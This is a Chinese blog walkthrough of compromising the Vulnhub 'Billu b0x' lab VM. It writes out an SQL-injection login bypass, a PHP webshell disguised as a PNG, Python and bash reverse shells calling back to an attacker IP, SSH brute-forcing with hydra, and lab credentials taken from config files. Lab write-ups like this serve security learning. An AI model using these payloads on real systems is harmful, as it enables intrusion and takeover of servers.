---
title: Billu b0x writeup
categories:
  - pentest
tags:
  - Null
---

最近在学习 `渗透测试` ，所以最近会记录一下对靶机的一些渗透思路，由于这是第一次记录渗透的过程，所以我尽量把所有的东西都描述详细一点，如有错误，请大佬联系我。

# 0x1 靶机配置



## 0x11 靶机来源及信息

来源地址：[https://www.vulnhub.com/entry/billu-b0x,188/](https://www.vulnhub.com/entry/billu-b0x,188/)

This Virtual machine is using ubuntu (32 bit)

Other packages used: 

- PHP
- Apache
- MySQL

This virtual machine is having medium difficulty level with tricks.

One need to break into VM using web application and from there escalate privileges to gain root access



## 0x12 靶机配置

从靶机信息中我们可以得到，这是一台 `x32` 的 `ubuntu` ，同时存在一个着一个 `web` 站点。我使用 `VM` 进行打开虚拟机，同时网络设置为 `nat` 。



# 0x2 信息收集



## 0x21 确认靶机 IP 地址

我们需要确认靶机的 `IP` 地址，这里我使用 `netdiscover` 对我这里的网段进行扫描。

```
netdiscover -r 192.168.248.0/24
```

经过简单的判断，我们得到

![Billu_b0x_1.png](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_1.png)

这个 `IP` 地址为我们的靶机。



## 0x22 搜集靶机端口信息

常规操作先用 `nmap` 进行简单测试。

```sh
nmap -T 5 -A 192.168.248.161
```

很快我们便得到常见端口的一些扫描结果。

![Billu_b0x_2.png](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_2.png)

我们得到了两个端口：22、80。

但是我还是不死心，所以准备用 `masscan` 把所有的端口都扫描一次。

```sh
masscan --ports=1-65535 192.168.248.161 --banners --rate 1000000 --wait=0
```

结果如下

![Billu_b0x_3.png](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_3.png)



# 0x3 漏洞挖掘

由于开启了 `web` 服务，所以我决定先从 web 入手进行扫描。

首先，一进入网站就发现一个登陆界面。简单的尝试了一下，发现过滤了 `'` 。先扫描一下目录吧。

```sh
dirb http://192.168.248.161/ /usr/share/dirb/wordlists/big.txt -r
```

![Billu_b0x_4.png](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_4.png)

发现存在的东西挺多的。

## 0x31 web 漏洞

经过代码审计，总结可得：

| 地址                                    | 信息                                    |
| :-------------------------------------- | --------------------------------------- |
| http://192.168.248.161/add.php          | 是一个假的上传页面                      |
| http://192.168.248.161/in.php           | phpinfo 的页面                          |
| http://192.168.248.161/index.php        | 首页/登陆页面 （存在 SQL 注入）         |
| http://192.168.248.161/panel.php        | 登陆后跳转的页面 （存在文件上传和包含） |
| http://192.168.248.161/phpmy/           | phpmyadmin 的登陆页面                   |
| http://192.168.248.161/show.php         | 什么也没有                              |
| http://192.168.248.161/test.php         | 任意文件下载                            |
| http://192.168.248.161/uploaded_images/ | 通过 panel.php 上传的文件会在这。       |



## 0x32 渗透思路

通过上面搜集到的信息，思路一下就出来了：

1. 可以通过任意文件下载将该网站文件，所有文件进行打包下载下来，通过审计代码绕过过滤，直接登陆网站，进行文件上传和包含。
2. 通过任意文件下载将该网站文件，将 `/etc/passwd` 以及 `/etc/shadow` （看用户权限够不够），或者在已知用户名的情况下通过 `ssh` 爆破密码登陆。
3. 通过任意文件下载当前网站数据库连接文件，得到数据库账号密码，通过 `phpmyadmin` 获取数据库中的信息，登陆网站进行文件上传和包含。
4. 通过任意文件下载 `phpmyadmin` 的默认配置文件，看是否存在什么有趣的东西。



# 0x4 漏洞利用

这里将上面所诉的思路全部实现。

## 0x41 第一种思路

我们要绕过 `SQL` 过滤，首先我们需要将 `index.php` 通过 `test.php` 的任意文件下载漏洞，将其下载到本机进行审计。

需要注意的是，`test.php` 是通过 `post` 接收 `file` 参数的。

`curl http://192.168.248.161/test.php --data file=index.php > index.php`



### 0x411 SQL 注入

由于单引号太多了，引起了解析故障，所以直接放出文件了： [**`index.php`**](/image/2019-04-24-Billu_b0x_writeup/index.php)

很明显了，通过 `str_replace` 将 `un` 和 `ps` 中的 `'` 给替换为空，导致我们无法直接通过 `'` 来控制 `SQL` 语句的闭合。

现在我们来尝试一下绕过，`'`  可以在 `SQL` 中将单引号 [转义](https://baike.baidu.com/item/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/86397?fr=aladdin) ，所以我们将POST数据构建为：

`un=or 1=1 -- \#&ps=\&login=let's login`

`SQL` 语句就如下所示，返回真，这样就可以绕过登陆判断了。

`select * from auth where  pass='\' and uname=' or 1=1 -- \';`



### 0x412 文件上传 && 文件包含 && 反弹 shell 

当绕过登陆后，进入到 `panel.php` ，找到一个文件上传：

![Billu_b0x_5.png](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_5.png)

但是发现有过滤，还好上面还有个任意文件下载。

和上面同样的原因，直接放出文件： [**`panel.php`**](/image/2019-04-24-Billu_b0x_writeup/panel.php)

简单的审计一下，发现了漏洞点，任意文件包含漏洞，这里我们可以先上传图片马，然后进行包含。

首先进入绕过登陆，并保存 `cookie`。

`curl http://192.168.248.161/index.php -d "un=or 1=1 -- \#&ps=\&login=let's login" -c cookie.jar`

携带 `cookie` 进行上传文件，这里 `printf` 首先打印的是 `png` 的文件头，由于服务端校验了文件头，所以我们必须对文件头进行伪造。

`printf "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00 <?php system(\$_POST['who']);?>" > shell.png`

`curl http://192.168.248.161/panel.php -F "image=@/root/Desktop/shell.png" -F "name=name" -F "address=address" -F "id=1337" -F "upload=upload" -b cookie.jar -v`

最后执行 `shell`，这里我用的是 `python` 反弹的 `shell` 。

```sh
curl http://192.168.248.161/panel.php -d "load=./uploaded_images/shell.png&continue=contnue&who=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.248.163\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" -b cookie.jar --output -
```



### 0x413 提权

刚才我们已经得到了返回的 `shell` 。首先 `id` 查看一下权限。

```sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

首先先查看一下内核版本

```sh
www-data@indishell:~$ uname -a
Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
```

得到了内核版本，用 `searchsploit` 搜索一下

![Billu_b0x_6](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_6.png)

这里刚好存在一个提权漏洞，根据脚本的提示我们将文件上传了 `/tmp` 下，进行操作。

![Billu_b0x_7](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_7.png)

很轻松就拿到了 `root` 权限。



上面留下了一个问题待解决，反弹 `shell` 的时候，这台机器出现了一个很神奇的地方。

```sh
bash -i &> /dev/tcp/192.168.248.163/4444 1>&0 | echo "123456"
```

这里通过 bash 直接反弹 shell 会出现一个报错：

```sh
bash: no job control in this shell
```

暂时先留一个坑在这里，以后在解决。



## 0x42 第二种思路



### 0x421 任意文件下载

这里可以通过 `任意文件下载` 将 `/etc/passwd` 下载。

`passwd` :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:106::/var/run/dbus:/bin/false
whoopsie:x:104:107::/nonexistent:/bin/false
landscape:x:105:110::/var/lib/landscape:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
```

得到用户  `root` 、`ica` 。由于 `/etc/shadow` 文件无法下载，所以这里只能够直接爆破 `ssh` 了。



### 0x422 爆破 ssh

首先检查 `/etc/ssh/sshd_config` 查看允许哪些用户登陆。

运气很好，我发现了 `PermitRootLogin yes`，那就直接爆破 `root` 吧。

`hydra -l root -P password.txt ssh://192.168.248.161`

![Billu_b0x_12](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_12.png)

好的，我们成功得到了 `root` 的密码，完成了渗透。



## 0x43 第三种思路

由于我们发现了 `phpmyadmin` ，我们可以连接数据库，从数据库中找到网站的登陆账号以及密码。

[**`index.php`**](/image/2019-04-24-Billu_b0x_writeup/index.php) 很明显的调用了数据库，我们可以从这里入手，但是没有看见任何创建数据库连接的语句，所有应该是在某个包含文件的地方连接了数据库。

这里有两个包含文件：`c.php` 、`head.php`。

`c.php` :

```php
<?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

// Check connection
if (mysqli_connect_errno())
  {
  echo "connection failed ->  " . mysqli_connect_error();
  }

?>
```

 简单的审计后发现 `c.php` 中存在数据库的账号密码，所有我们便可以利用了。



### 0x431 获得网站账号密码

首先登陆 `phpmyadmin`

![Billu_b0x_8 ](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_8.png)

然后我们发现了 `ica_lab` 数据库。

![Billu_b0x_9](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_9.png)

进入数据库后，发现了三个表。

![Billu_b0x_10](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_10.png)

经过刚才审计 `index.php` 中可得 `auth` 表中存在着账号密码，进入 `auth`  表。

![Billu_b0x_11](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_11.png)

到这里，我们就获得了账号以及密码。

账号：`biLLu`

密码：`hEx_it`



### 0x432 文件上传 && 文件包含 && 反弹 shell 

这里和 `第一种思路` 中的方法是同样的，所以不再赘述了。



### 0x433 提权

这里和 `第一种思路` 中的方法是同样的，所以不再赘述了。



## 0x44 第四种思路

### 检查 phpmyadmin 配置文件

这里主要是靠运气，当看见 `phpmyadmin` 的登陆页面的时候，脑子里突然出现了一个大胆的想法，就是检查一下 `phpmyadmin` 的配置文件，然而果不其然。

`curl http://192.168.248.161/test.php --data file=phpmy/config.inc.php > config.inc.php`

`config.inc.php` :

```php
<?php

/* Servers configuration */
$i = 0;

/* Server: localhost [1] */
$i++;
$cfg['Servers'][$i]['verbose'] = 'localhost';
$cfg['Servers'][$i]['host'] = 'localhost';
$cfg['Servers'][$i]['port'] = '';
$cfg['Servers'][$i]['socket'] = '';
$cfg['Servers'][$i]['connect_type'] = 'tcp';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['auth_type'] = 'cookie';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'roottoor';
$cfg['Servers'][$i]['AllowNoPassword'] = true;

/* End of servers configuration */

$cfg['DefaultLang'] = 'en-utf-8';
$cfg['ServerDefault'] = 1;
$cfg['UploadDir'] = '';
$cfg['SaveDir'] = '';


/* rajk - for blobstreaming */
$cfg['Servers'][$i]['bs_garbage_threshold'] = 50;
$cfg['Servers'][$i]['bs_repository_threshold'] = '32M';
$cfg['Servers'][$i]['bs_temp_blob_timeout'] = 600;
$cfg['Servers'][$i]['bs_temp_log_threshold'] = '32M';


?>
```

竟然发现了 `root` 的账号密码，简直是意外之喜啊。

成功使用这个账号密码登陆，得到 `shell` 。

